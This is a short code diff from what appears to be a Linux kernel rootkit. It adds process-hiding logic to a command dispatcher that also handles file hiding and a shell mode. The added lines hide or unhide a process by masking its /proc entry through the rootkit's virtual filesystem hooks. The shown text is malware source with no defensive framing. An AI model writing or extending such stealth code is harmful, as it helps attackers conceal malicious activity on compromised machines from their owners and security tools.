@@ -26,10 +26,12 @@ void exec_cmd(struct cmd_t *cmd)
                 vfs_unhide_file(str_remove_duplicates(cmd->arg));
                 break;
             case HIDE_PROCESS:
-                // kstrtoul(cmd->arg, 10, &res);
-                // dbg("PID: %d\n", res);
+                snprintf(proc_path, 1000, "/proc/%s", cmd->arg);
+                vfs_hide_file(str_remove_duplicates(proc_path));
                 break;
             case UNHIDE_PROCESS:
+                snprintf(proc_path, 1000, "/proc/%s", cmd->arg);
+                vfs_unhide_file(str_remove_duplicates(proc_path));
                 break;
             case MODE_SHELL:
                 break;
